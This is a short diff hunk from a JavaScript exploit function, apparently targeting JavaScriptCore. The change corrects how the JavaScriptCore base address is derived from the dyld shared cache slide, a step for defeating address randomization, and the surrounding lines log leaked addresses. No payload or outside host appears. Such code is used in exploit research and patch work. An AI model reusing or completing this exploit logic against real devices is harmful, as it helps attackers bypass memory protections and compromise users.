@@ -536,7 +536,7 @@ function exploit(){
         var nslide = Sub(v_tlb, vtab); 
         var slide = Sub(nslide, new Int64('0x10'));
         log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
-        var jbase = Add(new Int64('0x1881BD000'), nslide);
+        var jbase = Add(new Int64('0x1881BD000'), slide);
         log('[+] And thus the JavaScriptCore base is '+jbase.toString(16));
         //var magic =  r32(base);
         //log('[+] Which has magic '+magic.toString(16));
